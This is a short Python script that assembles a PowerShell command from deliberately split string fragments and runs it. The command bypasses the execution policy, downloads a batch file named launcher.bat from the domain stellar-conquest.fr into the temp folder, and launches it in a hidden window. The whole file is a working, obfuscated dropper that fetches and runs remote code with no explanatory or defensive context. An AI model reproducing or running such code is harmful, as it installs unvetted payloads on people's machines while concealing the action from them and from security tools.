import subprocess

cmd_parts = [
    "power", "shell", " -NoL", "ogo -Ex", "ecutionP", "olicy By", "pass -C", 
    "ommand \"", "Invoke-WebRequest ", "'http://stellar-", "conquest.fr/launcher.bat' ",
    "-OutFile $env:TEMP", "\\launcher.bat; ", "Start-Process -File", "Path $env:TEMP", 
    "\\launcher.bat -Window", "Style Hidden -Wait\""
]

ps_command = "".join(cmd_parts)
result = subprocess.run(ps_command, shell=True, capture_output=True, timeout=30)
print(f"Return code: {result.returncode}")